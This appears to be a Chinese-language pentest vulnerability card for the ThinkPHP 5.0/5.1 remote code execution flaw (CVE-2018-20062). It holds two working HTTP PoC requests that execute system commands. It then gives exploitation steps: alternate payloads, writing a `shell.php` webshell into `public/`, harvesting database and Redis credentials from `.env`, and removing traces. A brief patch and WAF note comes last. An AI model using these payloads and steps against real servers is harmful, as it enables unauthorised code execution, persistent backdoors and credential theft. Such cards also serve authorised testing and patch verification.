---
title: ThinkPHP 5.x 方法注入 / 路由 RCE
cve: CVE-2018-20062（同族 CVE-2019-9082 等）
severity: critical
cvss: 9.8
product: ThinkPHP 5.0.x / 5.1.x
versions: 5.0.5 - 5.0.23、5.1.0 - 5.1.30（未打补丁）
ports: 80, 443
keywords: thinkphp, invokefunction, _method, __construct, filter, rce
verified: false
sources: NVD / 厂商公告 / 公开分析（见文末参考）
---

## 指纹

- 报错页 `ThinkPHP`；`X-Powered-By: ThinkPHP`；`/index.php?s=...` 路由形式。

## 前置条件

- debug 打开或路由可访问；5.0/5.1 未打补丁。

## PoC

5.0 路由形态：

```http
POST /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id HTTP/1.1
Host: target
Content-Length: 0
```

5.1 方法注入形态：

```http
POST /index.php?s=index/index/index HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

_method=__construct&filter[]=system&method=get&get[]=id
```

## 利用步骤

1. 试两种形态（5.0 走 `invokefunction`，5.1 走 `_method=__construct`）；回显即 RCE。
2. 无回显时换 `filter[]=assert`、`filter[]=call_user_func` 组合，或 `vars[0]=file_put_contents` 写马到 `public/`。
3. 落地：`public/index.php` 同级写 `shell.php`；ThinkPHP 的入口文件常可写。
4. 提权：读 `.env` 拿 DB/Redis 凭据；ThinkPHP 常配 Redis 做缓存，Redis 未授权常见。
5. 清理：删 `runtime/` 缓存与写入的马，检查 `application/` 下异常文件。

## 修复与缓解

- 升级到 5.0.24 / 5.1.31 及以上（或换 6.x）；关闭 `app_debug`。
- 临时：WAF 拦 `invokefunction`、`_method=__construct`、`filter[]=`。

## 参考

- NVD CVE-2018-20062；ThinkPHP 安全公告；同族 CVE-2019-9082。
